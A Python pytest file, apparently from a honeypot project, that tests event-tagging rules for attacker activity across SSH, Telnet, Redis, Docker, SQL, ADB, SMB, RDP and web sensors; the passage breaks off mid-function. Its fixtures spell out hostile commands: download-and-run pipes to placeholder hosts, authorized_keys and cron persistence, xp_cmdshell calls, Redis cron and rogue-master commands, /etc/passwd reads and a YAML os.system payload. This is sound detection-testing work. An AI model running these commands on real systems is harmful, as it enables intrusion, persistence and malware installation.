"""Tagging rules: every shipped rule has positive and negative examples; the engine is strict."""

import time
from collections.abc import Iterator
from pathlib import Path
from typing import Any

import pytest
from suckerpot_common import SensorName

from ingest.scanners import SAFE_FLAGS
from ingest.tagging import RuleError, RuleSet, glob_match, load_rules
from ingest.tagging.engine import Cond, Leaf, command_words

RULES_DIR = Path(__file__).resolve().parents[1] / "rules"
ALL = load_rules(RULES_DIR)
BY_ID = {r.id: r for r in ALL.rules}


def fires(rule_id: str, etype: str, sensor: str, data: dict[str, Any]) -> bool:
    return bool(RuleSet([BY_ID[rule_id]]).tag_event(etype, sensor, data))


def session_fires(rule_id: str, **facts: Any) -> bool:
    base = {
        "session.sensor": "ssh", "session.event_count": 1, "session.login_attempts": 0,
        "session.login_success": False, "session.commands": 0, "session.downloads": 0,
        "session.http_requests": 0, "session.tags": [], "session.known_scanner": None,
        "session.abuse_score": None,
    }  # fmt: skip
    return bool(RuleSet([BY_ID[rule_id]]).tag_session({**base, **facts}))


def cmd(text: str, sensor: str = "ssh") -> tuple[str, str, dict[str, Any]]:
    return ("command", sensor, {"input": text})


def http(method: str, path: str, **extra: Any) -> tuple[str, str, dict[str, Any]]:
    return ("http_request", "web", {"method": method, "path": path, **extra})


def flagged(
    sensor: str, flags: list[str], etype: str = "scan", **extra: Any
) -> tuple[str, str, dict[str, Any]]:
    return (etype, sensor, {"flags": flags, **extra})


def redis(
    command: str, input_: str | None = None, flags: list[str] | None = None
) -> tuple[str, str, dict[str, Any]]:
    """A command event as the Redis sensor records it (upper-case name, redis-cli style line)."""
    return (
        "command",
        "redis",
        {"command": command, "input": input_ or command, "flags": flags or []},
    )


def docker(
    method: str, path: str, flags: list[str] | None = None
) -> tuple[str, str, dict[str, Any]]:
    return ("http_request", "docker", {"method": method, "path": path, "flags": flags or []})


def sql(sensor: str, text: str, flags: list[str] | None = None) -> tuple[str, str, dict[str, Any]]:
    return ("command", sensor, {"input": text, "flags": flags or []})


Case = tuple[str, str, dict[str, Any]]
SERVICE_POSITIVE: dict[str, list[Case]] = {
    "redis-persistence": [flagged("redis", ["cron_write"], "command"), flagged("redis", ["cron_payload"], "command"),
                          flagged("redis", ["ssh_key_payload"], "command"),
                          flagged("redis", ["config_set_dir", "ssh_key_write"], "command")],
    "redis-rogue-master": [flagged("redis", ["slaveof"], "command"),
                           flagged("redis", ["module_load"], "command")],
    "docker-miner": [flagged("docker", ["container_create", "miner"], "http_request")],
    "docker-container-escape": [flagged("docker", ["privileged"], "http_request"),
                                flagged("docker", ["host_mount"], "http_request"),
                                flagged("docker", ["docker_sock_mount"], "command")],
    "sql-rce": [flagged("mssql", ["xp_cmdshell"], "command"), flagged("mssql", ["sp_oacreate"], "command"),
                cmd("EXEC master..xp_cmdshell 'whoami'", "mssql"),
                cmd("select sp_OACreate 1", "mssql"), flagged("mysql", ["udf"], "command"),
                flagged("mssql", ["lolbin"], "command"), flagged("mssql", ["shell_command"], "command"), flagged("mysql", ["xp_cmdshell"], "command")],
    "db-ransom": [flagged("mysql", ["ransom_note", "drop_database"], "command"), flagged("mssql", ["ransom_note"], "command"),
                  flagged("redis", ["ransom_note"], "command")],
    "service-download-drop": [
        ("download_attempt", "redis", {"url": "http://x/a"}), ("download_attempt", "mssql", {"url": "http://x/a"}),
        ("download_attempt", "docker", {"url": "http://x/a"}), ("download_attempt", "adb", {"url": "http://x/a"}),
        ("download_attempt", "synology", {"url": "http://x/a"}),
    ],
    "adb-malware-drop": [flagged("adb", ["adb_push"], "command"), flagged("adb", ["adb_install"], "command")],
    "adb-mirai": [("command", "adb", {"flags": ["adb_shell"], "input": "cd /data/local/tmp; busybox ECCHI"}),
                  ("command", "adb", {"flags": ["adb_shell"], "input": "/bin/busybox ZORRO"})],
    "adb-mirai-download": [("download_attempt", "adb", {"url": "http://198.51.100.9/x", "command": "busybox MIRAI; busybox wget http://198.51.100.9/x"})],
    "smb-eternalblue": [flagged("smb", ["eternalblue"]), flagged("smb", ["smbv1", "ms17_010"])],
    "smb-v1-probe": [
        ("scan", "smb", {"kind": "smb1_command", "smb1_command_name": "trans2", "flags": ["smbv1"]}),
        ("scan", "smb", {"kind": "smb1_command", "smb1_command_name": "nt_transact", "flags": ["smbv1"]}),
        ("scan", "smb", {"kind": "smb1_command", "smb1_command_name": "session_setup_andx", "flags": ["smbv1"]}),
        ("scan", "smb", {"kind": "smb1_negotiate", "smb1_outcome": "reset", "flags": ["smbv1"]}),
    ],
    "redis-miner": [flagged("redis", ["miner"], "command"), flagged("redis", ["kinsing", "dropper"], "command")],
    "sip-fraud": [flagged("sip", ["invite", "toll_fraud"], "command"),
                  flagged("sip", ["invite", "toll_fraud", "register"], "login_attempt")],
    "sip-probe": [flagged("sip", ["register"], "login_attempt"), flagged("sip", ["invite"], "command"),
                  flagged("sip", ["register", "scanner_ua"])],
    "rdp-bluekeep": [flagged("rdp", ["bluekeep_probe"], "disconnect"),
                     flagged("rdp", ["rdp_ntlm", "bluekeep_probe"], "disconnect")],
    "rdp-weak-credentials": [flagged("rdp", ["rdp_ntlm", "weak_password_match"], "disconnect"),
                             flagged("rdp", ["weak_password_match"], "disconnect")],
    "rdp-cleartext": [flagged("rdp", ["rdp_nla_off"], "disconnect"),
                      ("login_attempt", "rdp", {"method": "rdp-nla-off", "username": "x"})],
    "sip-options-scan": [flagged("sip", ["options_scan"]), flagged("sip", ["scanner_ua", "response"])],
    "synology-dsm": [flagged("synology", ["dsm_api"], "http_request"),
                     flagged("synology", ["dsm_api", "dsm_login"], "http_request")],
    "synology-exploit": [flagged("synology", ["dsm_api", "sid_forge"], "http_request"),
                         flagged("synology", ["dsm_api", "scgi_injection"], "http_request")],
    "synology-c3rb3r": [flagged("synology", ["ransom_indicator"], "http_request")],
    "redis-fingerprint": [
        redis("INFO"), redis("INFO", "info server"), redis("PING"), redis("QUIT"), redis("GET", "GET foo"),
        redis("GETRANGE", "GETRANGE foo 0 10"), redis("CLIENT", "CLIENT LIST"), redis("KEYS", "KEYS *"),
        redis("COMMAND"), redis("CONFIG", "CONFIG GET dir"), redis("CONFIG", "config get *"),
        redis("info"),
    ],
    "docker-fingerprint": [
        docker("GET", "/version", ["recon"]), docker("GET", "/v1.47/info", ["recon"]),
        docker("GET", "/containers/json", ["recon"]), docker("HEAD", "/images/json", ["recon"]),
        docker("GET", "/_ping"), docker("HEAD", "/v1.47/_ping"),
    ],
    "sql-fingerprint": [
        sql("mysql", "select @@version_comment limit 1"), sql("mysql", "SELECT VERSION()"),
        sql("mysql", "SHOW DATABASES", ["show_databases"]), sql("mysql", "show variables like 'version%'"),
        sql("mysql", "SELECT table_name FROM information_schema.tables", ["schema_recon"]),
        sql("mysql", "SELECT USER(), DATABASE()", ["schema_recon"]), sql("mssql", "SELECT @@version"),
        sql("mssql", "select @@servername"), sql("mssql", "SELECT name FROM sys.databases"),
    ],
}  # fmt: skip
SERVICE_NEGATIVE: dict[str, list[Case]] = {
    "redis-persistence": [flagged("redis", ["config_set_dir"], "command"), flagged("ssh", ["cron_write"], "command"),
                          flagged("web", ["ssh_key_write"], "http_request")],
    "redis-rogue-master": [flagged("redis", ["config_set_dir"], "command"), flagged("mysql", ["slaveof"], "command")],
    "docker-miner": [flagged("docker", ["container_create"], "http_request"), flagged("ssh", ["miner"], "command")],
    "docker-container-escape": [flagged("docker", ["container_create", "image:alpine"], "http_request"),
                                flagged("redis", ["privileged"], "command")],
    "sql-rce": [cmd("select 1", "mssql"), flagged("mssql", ["into_outfile"], "command"),
                cmd("xp_cmdshell whoami", "ssh"), flagged("redis", ["xp_cmdshell"], "command")],
    "db-ransom": [flagged("mysql", ["into_outfile"], "command"), flagged("sip", ["drop_database"]),
                  flagged("mysql", ["drop_database"], "command"),
                  flagged("web", ["ransom_note"], "http_request")],
    "service-download-drop": [
        ("download_attempt", "ssh", {"url": "http://x/a"}), ("command", "redis", {"input": "SET a b"}),
        ("download_attempt", "sip", {"url": "http://x/a"}),
    ],
    "adb-malware-drop": [flagged("adb", ["adb_shell"], "command"), flagged("ssh", ["adb_push"], "command")],
    "adb-mirai": [("command", "adb", {"flags": ["adb_shell"], "input": "getprop ro.product.model"}),
                  ("command", "ssh", {"flags": ["adb_shell"], "input": "busybox ECCHI"}),
                  # generic busybox use or download-and-run is not a family
                  ("command", "adb", {"flags": ["adb_shell"], "input": "busybox wget http://198.51.100.9/x"}),
                  ("command", "adb", {"flags": ["adb_shell"], "input": "cat /dev/watchdog"})],
    "adb-mirai-download": [("download_attempt", "adb", {"url": "http://x/y", "command": "curl http://x/y"}),
                           ("download_attempt", "ssh", {"command": "busybox ECCHI"}),
                           ("download_attempt", "adb", {"command": "busybox wget http://x/y"})],
    "smb-eternalblue": [
        flagged("smb", ["smbv1", "null_session"]), flagged("ssh", ["eternalblue"]),
        ("scan", "smb", {"kind": "smb1_negotiate", "smb1_outcome": "reset", "flags": ["smbv1"]}),
        ("scan", "smb", {"kind": "smb1_command", "smb1_command_name": "trans2", "flags": ["smbv1"]}),
        ("scan", "smb", {"kind": "smb1_command", "smb1_command_name": "nt_transact", "flags": ["smbv1"]}),
    ],
    "smb-v1-probe": [
        flagged("smb", ["smbv1"], "login_attempt"), flagged("ssh", ["smbv1"]),
        # a multi-protocol negotiate from a modern client is ordinary
        ("scan", "smb", {"kind": "smb1_negotiate", "smb1_outcome": "steer_smb2_wildcard", "flags": ["smbv1"]}),
        ("scan", "smb", {"kind": "malformed_smb2", "flags": ["ntlm"]}),
    ],
    "redis-miner": [flagged("redis", ["download"], "command"), flagged("docker", ["miner"], "command")],
    "sip-fraud": [flagged("sip", ["options_scan"]), flagged("web", ["invite", "toll_fraud"], "http_request"),
                  flagged("sip", ["invite"], "command"), flagged("sip", ["register"], "login_attempt"),
                  flagged("sip", ["toll_fraud"])],
    "sip-probe": [flagged("sip", ["options_scan"]), flagged("web", ["register"], "http_request"),
                  flagged("sip", ["invite", "toll_fraud"], "command")],
    "rdp-bluekeep": [flagged("rdp", ["rdp_ntlm"], "disconnect"), flagged("smb", ["bluekeep_probe"]),
                     flagged("rdp", ["rdp_ntlm", "null_session"], "disconnect")],
    "rdp-weak-credentials": [flagged("rdp", ["rdp_ntlm"], "disconnect"), flagged("ssh", ["weak_password_match"], "disconnect")],
    "rdp-cleartext": [flagged("rdp", ["rdp_ntlm"], "disconnect"),
                      ("login_attempt", "ssh", {"method": "rdp-nla-off", "username": "x"}),
                      ("login_attempt", "rdp", {"method": "rdp-ntlm", "username": "x"})],
    "sip-options-scan": [flagged("sip", ["invite"]), flagged("smb", ["options_scan"])],
    "synology-dsm": [flagged("synology", ["dsm_version_probe"], "http_request"),
                     flagged("web", ["dsm_api"], "http_request")],
    "synology-exploit": [flagged("synology", ["dsm_api", "dsm_login"], "http_request"),
                         flagged("web", ["dsm_api", "sid_forge"], "http_request"),
                         # a session id or injection shape off the DSM web API is not enough
                         flagged("synology", ["sid_forge"], "http_request"),
                         flagged("synology", ["scgi_injection"], "http_request")],
    "synology-c3rb3r": [flagged("synology", ["file_write"], "http_request"),
                        flagged("web", ["ransom_indicator"], "http_request")],
    "redis-fingerprint": [
        redis("SET", "SET k v"), redis("CONFIG", "CONFIG SET dir /var/spool/cron", ["config_set", "config_set_dir"]),
        redis("CONFIG", "CONFIG SET dbfilename root"), redis("FLUSHALL"), redis("SLAVEOF", "SLAVEOF 192.0.2.7 6379", ["slaveof"]),
        redis("MODULE", "MODULE LOAD /tmp/x.so", ["module_load"]), redis("EVAL", "EVAL 1 0", ["eval"]),
        # a command the sensor does not know says nothing about what the visitor wants
        redis("SYSTEM.EXEC", "SYSTEM.EXEC id", ["unknown_command"]), redis("FOO", "FOO", ["unknown_command"]),
        ("command", "ssh", {"command": "INFO", "input": "INFO", "flags": []}),
        ("login_attempt", "redis", {"command": "INFO", "username": "default", "password": "x"}),
        ("scan", "redis", {"kind": "cross_protocol", "command": "INFO"}),
    ],
    "docker-fingerprint": [
        docker("POST", "/containers/create", ["container_create"]), docker("POST", "/v1.47/exec/abc/start"),
        docker("GET", "/"), docker("GET", "/_pingx"), docker("POST", "/_ping"),
        ("http_request", "web", {"method": "GET", "path": "/version", "flags": ["recon"]}),
        ("scan", "docker", {"kind": "non_http", "flags": ["recon"]}),
    ],
    "sql-fingerprint": [
        sql("mysql", "select 1"), sql("mysql", "SET NAMES utf8mb4"), sql("mysql", "SELECT * FROM users"),
        sql("mysql", "SELECT @@version INTO OUTFILE '/tmp/v'", ["into_outfile"]),
        sql("mysql", "SELECT VERSION(), SLEEP(5)", ["sql_delay"]),
        sql("mssql", "EXEC xp_cmdshell 'ver'; SELECT @@version", ["xp_cmdshell"]),
        sql("mysql", "SELECT LOAD_FILE('/etc/passwd'), VERSION()", ["load_file"]),
        sql("mysql", "SELECT user, authentication_string FROM mysql.user", ["user_dump"]),
        sql("ssh", "SELECT @@version"), sql("redis", "SHOW DATABASES", ["show_databases"]),
        ("login_attempt", "mysql", {"username": "@@version", "password": "x"}),
    ],
}  # fmt: skip

POSITIVE: dict[str, list[tuple[str, str, dict[str, Any]]]] = {
    "recon-commands": [
        cmd("uname -a"), cmd("cat /proc/cpuinfo | grep name | wc -l"), cmd("/usr/bin/nproc"),
        cmd("free -m; id"), cmd("w"), cmd("cat /etc/os-release"),
        cmd("getprop ro.product.model", "adb"), cmd("getprop ro.product.cpu.abi", "adb"),
        cmd("screencap -p", "adb"),
    ],
    "iot-shell-probe": [
        cmd("enable", "telnet"), cmd("system", "telnet"), cmd("shell", "telnet"), cmd("linuxshell", "telnet"),
        cmd("sh", "telnet"), cmd("ping; sh", "telnet"), cmd("ping ; sh", "telnet"), cmd("ENABLE", "telnet"),
        cmd("/bin/busybox cat /proc/self/exe || cat /proc/self/exe", "telnet"),
        cmd("cat /proc/self/exe", "telnet"), cmd("/bin/busybox QXWFTRBN", "telnet"), cmd("busybox", "telnet"),
        cmd("/bin/busybox ECCHI", "telnet"),
    ],
    "mirai-busybox": [cmd("/bin/busybox ECCHI"), cmd("cd /tmp; /bin/busybox MIRAI"), cmd("./mirai.arm7"),
                      cmd("/bin/busybox ZORRO", "telnet")],
    "crypto-miner": [
        cmd("./xmrig -o stratum+tcp://pool:3333"), cmd("wget http://x/minerd -O m"),
        ("download_attempt", "ssh", {"url": "http://198.51.100.9/kinsing", "tool": "wget"}),
        ("download_attempt", "ssh", {"url": "http://x/y", "command": "curl x | sh --donate-level 1"}),
    ],
    "exec-attempt": [
        cmd("chmod +x /tmp/a"), cmd("chmod 777 x.sh && ./x.sh"), cmd("./payload"),
        cmd("curl http://x/s.sh | sh"), cmd("wget -qO- http://x | bash"),
    ],
    "persistence": [
        cmd("echo key >> ~/.ssh/authorized_keys"), cmd("echo x >> /etc/rc.local"),
        cmd("chattr +i /root/.ssh"), cmd("(crontab -l; echo '* * * * * /tmp/x') | crontab -"),
        cmd("systemctl enable evil.service"), cmd("cat key.pub > /root/.ssh/authorized_keys"),
        cmd("echo x >>/etc/cron.d/y 2>/dev/null"), cmd("cp k ~/.ssh/authorized_keys"),
    ],
    "php2shell": [
        http("POST", "/index.php", flags=["php2shell", "upload_progress"]),
        http("GET", "/x", flags=["php2shell", "lfi", "session_include", "session_ref_match"]),
    ],
    "php-upload-progress-probe": [
        http("POST", "/", flags=["upload_progress"]),
        http("GET", "/index.php", query="PHP_SESSION_UPLOAD_PROGRESS=x"),
        http("GET", "/upload_progress.php"),
    ],
    "wordpress-bruteforce": [
        http("POST", "/wp-login.php"), http("POST", "/blog/wp-login.php"), http("POST", "/xmlrpc.php"),
    ],
    "phpmyadmin-bruteforce": [
        http("POST", "/phpmyadmin/index.php"), http("POST", "/pma/"), http("POST", "/mysqladmin/"),
    ],
    "env-file-probe": [
        http("GET", "/.env"), http("GET", "/app/.env.production"), http("GET", "/.git/config"),
        http("GET", "/.aws/credentials"), http("GET", "/x/.git/HEAD"),
        http("GET", "/.env.local"), http("GET", "/.env", flags=["recon_dotfile", "config_leak"]),
        # spellings the path list does not have: the sensor's own flags catch them
        http("GET", "/admin/config.php", flags=["config_leak"]),
        http("GET", "/wp-config.php.bak", flags=["backup_probe", "config_leak"]),
        http("GET", "/site/dump.sql", flags=["backup_probe"]),
        http("GET", "/.vscode/sftp.json", flags=["recon_dotfile"]),
        http("GET", "/.svn/entries", flags=["recon_dotfile"]),
    ],
    "web-app-probe": [
        http("GET", "/wp-json/", flags=["wordpress"]), http("GET", "/phpinfo.php", flags=["phpinfo_probe"]),
        http("GET", "/info.php", flags=["phpinfo_probe"]), http("HEAD", "/actuator/health", flags=["spring_probe"]),
        http("GET", "/server-status", flags=["recon"]), http("OPTIONS", "/jenkins/", flags=["jenkins_probe"]),
        http("GET", "/remote/login", flags=["vpn_probe", "no_user_agent"]),
        http("GET", "/phpmyadmin/", flags=["phpmyadmin"]), http("GET", "/hnap1", flags=["router_probe"]),
    ],
    "scanner-user-agent": [
        http("GET", "/", user_agent="Mozilla/5.0 zgrab/0.x"), http("GET", "/", user_agent="masscan/1.3"),
        http("GET", "/", user_agent="Nmap Scripting Engine"), http("GET", "/", user_agent="Nuclei - Open-source"),
        # a scanner the sensor knows by name and this list does not
        http("GET", "/", user_agent="sqlmap/1.7", flags=["scanner_ua"]),
    ],
    **SERVICE_POSITIVE,
}  # fmt: skip

NEGATIVE: dict[str, list[tuple[str, str, dict[str, Any]]]] = {
    "recon-commands": [cmd("echo hello"), cmd("ls -la /tmp"), cmd("ping 192.0.2.1"),
                       ("login_attempt", "ssh", {"input": "uname"}),
                       cmd("setprop persist.sys.x 1", "adb"), cmd("pm list packages", "adb")],
    "iot-shell-probe": [
        # only the Telnet device shell, and the whole line, not a word inside a longer command
        cmd("sh", "ssh"), cmd("enable", "ssh"), cmd("sh", "adb"), cmd("/bin/busybox QXWFTRBN", "ssh"),
        cmd("enable now", "telnet"), cmd("shell script.sh", "telnet"), cmd("echo sh", "telnet"),
        cmd("ping 192.0.2.1; shutdown", "telnet"), cmd("ls /bin", "telnet"), cmd("cat /etc/hostname", "telnet"),
        ("login_attempt", "telnet", {"input": "sh", "username": "sh"}),
        # BusyBox steps that download or make a file executable are other rules' business
        cmd("busybox wget http://198.51.100.9/x -O /tmp/x", "telnet"),
        cmd("/bin/busybox tftp -g -r a 192.0.2.1", "telnet"), cmd("cd /tmp; busybox chmod 777 x", "telnet"),
    ],
    "mirai-busybox": [cmd("ls /bin"), cmd("echo hi"), cmd("enable", "telnet"), cmd("sh", "telnet"),
                      cmd("busybox wget http://x/y"), cmd("busybox ls /bin"), cmd("cat /dev/watchdog"),
                      cmd("curl http://x/s.sh | sh")],
    "crypto-miner": [cmd("ls -la"), cmd("wget http://x/index.html"),
                     ("download_attempt", "ssh", {"url": "http://example.org/readme.txt"})],
    "exec-attempt": [cmd("chmod 600 secret"), cmd("ls ./"), cmd("echo shell"), cmd("cat file | wc -l")],
    "persistence": [cmd("cat /etc/hostname"), cmd("echo cron"), cmd("crontab -l"),
                    cmd("cat ~/.ssh/authorized_keys"), cmd("cat /etc/rc.local"),
                    cmd("cat ~/.ssh/authorized_keys 2>/dev/null"), cmd("cat /etc/rc.local 2> /dev/null"), cmd("cat .bashrc")],
    "php2shell": [http("GET", "/index.php"), http("POST", "/", flags=["other"]),
                  http("GET", "/", query="a=b"),
                  # touching upload-progress, or a bare session-file include, is only a probe
                  http("POST", "/", flags=["upload_progress"]),
                  http("GET", "/index.php", query="PHP_SESSION_UPLOAD_PROGRESS=x"),
                  http("GET", "/upload_progress.php"),
                  http("GET", "/x", flags=["lfi", "session_include"])],
    "php-upload-progress-probe": [http("GET", "/index.php"), http("POST", "/", flags=["other"]),
                                  http("POST", "/", flags=["php2shell", "upload_progress"])],
    "wordpress-bruteforce": [http("GET", "/wp-login.php"), http("POST", "/login.php"),
                             http("POST", "/wp-login.php.bak")],
    "phpmyadmin-bruteforce": [http("GET", "/phpmyadmin/"), http("POST", "/index.php")],
    "env-file-probe": [http("GET", "/.environment"), http("GET", "/index.html"),
                       http("GET", "/envfile"), http("GET", "/"), http("GET", "/robots.txt"),
                       http("GET", "/favicon.ico"), http("GET", "/wp-json/", flags=["wordpress"]),
                       http("GET", "/phpinfo.php", flags=["phpinfo_probe"]),
                       http("GET", "/.well-known/security.txt", flags=["recon"]),
                       http("GET", "/", flags=["no_user_agent"])],
    "web-app-probe": [
        # plain homepage, robots and favicon visits stay untagged
        http("GET", "/"), http("GET", "/robots.txt"), http("GET", "/favicon.ico", flags=["no_user_agent"]),
        http("GET", "/.env", flags=["recon_dotfile", "config_leak"]),
        # not a safe method
        http("POST", "/wp-login.php", flags=["wordpress"]), http("PUT", "/phpinfo.php", flags=["phpinfo_probe"]),
        # an exploit shape on the same request: not a plain probe
        http("GET", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", flags=["phpunit_probe", "phpunit_rce", "rce"]),
        http("GET", "/cgi-bin/test.cgi", flags=["cgi_probe", "shellshock"]),
        http("GET", "/wp-content/plugins/x/../../../etc/passwd", flags=["wordpress", "path_traversal", "lfi"]),
        http("GET", "/index.php", flags=["wordpress", "upload_progress"]),
        http("GET", "/index.php", flags=["php2shell", "upload_progress", "wordpress"]),
        http("GET", "/boaform/admin/formLogin", flags=["router_probe", "router_exploit"]),
        # the flag set by the web sensor only
        ("http_request", "docker", {"method": "GET", "path": "/version", "flags": ["recon"]}),
        ("http_request", "synology", {"method": "GET", "path": "/wp-json/", "flags": ["wordpress"]}),
        # a path alone, with no flag from the sensor, proves nothing
        http("GET", "/wp-json/"), http("GET", "/phpinfo.php"),
    ],
    "scanner-user-agent": [http("GET", "/", user_agent="Mozilla/5.0 (X11; Linux) Firefox/130"),
                           http("GET", "/", user_agent="curl/8.5.0"), http("GET", "/"),
                           http("GET", "/", user_agent="curl/8.5.0", flags=["no_user_agent"])],
    **SERVICE_NEGATIVE,
}  # fmt: skip


@pytest.mark.parametrize(("rule_id", "case"), [(r, c) for r, cs in POSITIVE.items() for c in cs])
def test_event_rule_positive(rule_id: str, case: tuple[str, str, dict[str, Any]]) -> None:
    assert fires(rule_id, *case), (rule_id, case)


@pytest.mark.parametrize(("rule_id", "case"), [(r, c) for r, cs in NEGATIVE.items() for c in cs])
def test_event_rule_negative(rule_id: str, case: tuple[str, str, dict[str, Any]]) -> None:
    assert not fires(rule_id, *case), (rule_id, case)


def test_session_rules() -> None:
    assert session_fires(
        "malware-drop", **{"session.downloads": 1, "session.tags": ["exec-attempt"]}
    )
    assert not session_fires("malware-drop", **{"session.downloads": 1})
    assert not session_fires("malware-drop", **{"session.tags": ["exec-attempt"]})
    assert session_fires("credential-stuffing", **{"session.login_attempts": 20})
    assert not session_fires("credential-stuffing", **{"session.login_attempts": 19})
    assert session_fires("scanner-reputation", **{"session.known_scanner": True})
    assert not session_fires("scanner-reputation", **{"session.known_scanner": False})
    assert not session_fires("scanner-reputation")


@pytest.mark.parametrize("sensor", [n.value for n in SensorName])
def test_credential_stuffing_applies_to_every_sensor(sensor: str) -> None:
    assert session_fires(
        "credential-stuffing", **{"session.sensor": sensor, "session.login_attempts": 25}
    )


def test_new_sensor_flags_end_to_end() -> None:
    assert ALL.tag_event(
        "command", "adb", {"flags": ["adb_shell", "adb_push"], "input": "busybox wget x"}
    ) == ["malware-drop"]
    assert ALL.tag_event("command", "adb", {"flags": ["adb_shell"], "input": "busybox ECCHI"}) == [
        "mirai"
    ]
    assert ALL.tag_event("scan", "sip", {"flags": ["options_scan"]}) == ["scanner"]
    assert ALL.tag_event("command", "redis", {"flags": ["cron_write"]}) == ["persistence"]


def test_every_shipped_rule_has_examples() -> None:
    event_ids = {r.id for r in ALL.event_rules}
    assert event_ids == set(POSITIVE) == set(NEGATIVE)
    assert {r.id for r in ALL.session_rules} == {
        "malware-drop",
        "credential-stuffing",
        "scanner-reputation",
    }


def test_required_tags_exist() -> None:
    assert {
        "recon", "mirai", "crypto-miner", "malware-drop", "persistence", "php2shell",
        "wordpress-bruteforce", "phpmyadmin-bruteforce", "credential-stuffing", "scanner",
        "env-file-probe", "redis-rogue-master", "container-escape", "sql-rce", "db-ransom",
        "eternalblue", "sip-fraud", "bluekeep", "weak-credentials", "rdp-cleartext",
        "synology-dsm", "synology-exploit", "c3rb3r", "smb-v1-probe", "php-upload-progress-probe",
        "service-probe", "iot-shell-probe",
    } <= set(ALL.tags)  # fmt: skip


def test_tag_event_unions_and_sorts() -> None:
    tags = ALL.tag_event("command", "ssh", {"input": "chmod +x xmrig; uname"})
    assert tags == ["crypto-miner", "exec-attempt", "recon"]


# ---- engine ---------------------------------------------------------------------------------


def write(tmp_path: Path, body: str) -> Path:
    (tmp_path / "r.yaml").write_text(body)
    return tmp_path


@pytest.mark.parametrize(
    "body",
    [
        "rules:\n  - {id: a, tag: x, when: {field: data.input, regex: '(a+)+$'}}\n",
        "rules:\n  - {id: a, tag: x, when: {field: data.secret, equals: 1}}\n",
        "rules:\n  - {id: a, tag: x, when: {field: data.__class__, equals: 1}}\n",
        "rules:\n  - {id: a, tag: 'Bad Tag', when: {field: type, equals: command}}\n",
        "rules:\n  - {id: a, tag: x, when: {field: session.commands, gte: 1}}\n",
        "rules:\n  - {id: a, tag: x, scope: session, when: {field: type, equals: command}}\n",
        "rules:\n  - {id: a, tag: x, when: {all: []}}\n",
        "rules:\n  - {id: a, tag: x, when: {field: type}}\n",
        "rules:\n  - {id: a, tag: x, when: {field: type, equals: a, in: [b]}}\n",
        "rules:\n  - {id: a, tag: x, when: {field: data.input, command_any: [/bin/sh]}}\n",
        "rules:\n  - {id: a, tag: x, when: {field: data.input, contains_any: [1, 2]}}\n",
        "rules:\n  - {id: a, tag: x, when: {field: data.port, gte: abc}}\n",
        "rules:\n  - {id: a, tag: x, when: {field: type, equals: a}}\n  - {id: a, tag: y, when: {field: type, equals: b}}\n",
        "rules: nope\n",
        "- just a list\n",
        "rules:\n  - {tag: x, when: {field: type, equals: a}}\n",
        "!!python/object/apply:os.system ['true']\n",
    ],
)
def test_invalid_rule_files_are_rejected(tmp_path: Path, body: str) -> None:
    with pytest.raises(RuleError):
        load_rules(write(tmp_path, body))


def test_deep_nesting_rejected(tmp_path: Path) -> None:
    cond = "{field: type, equals: a}"
    for _ in range(12):
        cond = "{not: " + cond + "}"
    with pytest.raises(RuleError, match="deeply"):
        load_rules(write(tmp_path, f"rules:\n  - {{id: a, tag: x, when: {cond}}}\n"))


def test_has_all_needs_every_value(tmp_path: Path) -> None:
    body = """
rules:
  - {id: any, tag: t-any, when: {field: data.flags, has: [alpha, beta]}}
  - {id: all, tag: t-all, when: {field: data.flags, has_all: [alpha, beta]}}
"""
    t = load_rules(write(tmp_path, body)).tag_event
    assert t("scan", "ssh", {"flags": ["ALPHA"]}) == ["t-any"]
    assert t("scan", "ssh", {"flags": ["beta", "alpha", "x"]}) == ["t-all", "t-any"]
    assert t("scan", "ssh", {"flags": "alpha"}) == [] and t("scan", "ssh", {}) == []
    with pytest.raises(RuleError, match="non-empty"):
        load_rules(
            write(tmp_path, "rules:\n  - {id: a, tag: x, when: {field: data.flags, has_all: []}}\n")
        )


def test_operators(tmp_path: Path) -> None:
    body = """
rules:
  - {id: eq, tag: t-eq, when: {field: data.port, equals: 2222}}
  - {id: cmp, tag: t-cmp, when: {all: [{field: data.status, gte: 400}, {field: data.status, lt: 500}]}}
  - {id: has, tag: t-has, when: {field: data.flags, has: [alpha, beta]}}
  - {id: nt, tag: t-not, when: {not: {field: data.method, equals: GET}}}
  - {id: ex, tag: t-ex, when: {field: data.url, exists: true}}
  - {id: cs, tag: t-cs, when: {field: data.input, contains: Secret, ci: false}}
  - {id: sw, tag: t-sw, when: {field: data.path, startswith: [/admin, /root]}}
  - {id: bt, tag: t-bool, when: {field: data.reason, equals: closed}}
"""
    rs = load_rules(write(tmp_path, body))
    t = rs.tag_event
    assert "t-eq" in t("scan", "ssh", {"port": 2222}) and "t-eq" not in t(
        "scan", "ssh", {"port": "2222"}
    )
    assert "t-cmp" in t("http_request", "web", {"status": 404})
    assert "t-cmp" not in t("http_request", "web", {"status": 200})
    assert "t-cmp" not in t("http_request", "web", {"status": "404"})  # strings are not numbers
    assert "t-has" in t("http_request", "web", {"flags": ["BETA"]})
    assert "t-has" not in t("http_request", "web", {"flags": "beta"})
    assert "t-not" in t("http_request", "web", {"method": "POST"})
    assert "t-ex" in t("http_request", "web", {"url": "x"}) and "t-ex" not in t("x", "web", {})
    assert "t-cs" in t("command", "ssh", {"input": "a Secret b"})
    assert "t-cs" not in t("command", "ssh", {"input": "a secret b"})
    assert "t-sw" in t("http_request", "web", {"path": "/ROOT/x"})
    assert "t-cs" not in t("command", "ssh", {"input": ["Secret"]})  # lists are not text


def test_non_string_values_never_crash() -> None:
    weird: list[Any] = [None, 5, 1.5, True, [], {}, ["a"], {"a": 1}, "x"]
    for v in weird:
        ALL.tag_event("command", "ssh", {"input": v, "path": v, "user_agent": v, "flags": v})
        ALL.tag_event("http_request", "web", {"method": v, "query": v, "url": v})


@pytest.mark.parametrize(
    ("pattern", "text", "ok"),
    [
        ("*/.env", "/a/.env", True), ("*/.env", "/.env.bak", False), ("a?c", "abc", True),
        ("a?c", "ac", False), ("*", "", True), ("**x", "yyx", True), ("a*b*c", "aXXbYYc", True),
        ("a*b*c", "aXXbYY", False), ("", "", True), ("", "a", False),
    ],
)  # fmt: skip
def test_glob(pattern: str, text: str, ok: bool) -> None:
    assert glob_match(pattern, text) is ok


def test_command_words() -> None:
    assert command_words("cd /tmp; /usr/bin/wget http://x/y.sh|sh && ./y.sh") >= {
        "cd",
        "wget",
        "sh",
        "y.sh",
    }


def test_large_and_pathological_inputs_are_fast() -> None:
    big = "a" * 1_000_000
    nasty = "a" * 200_000 + "b"
    start = time.perf_counter()
    for _ in range(20):
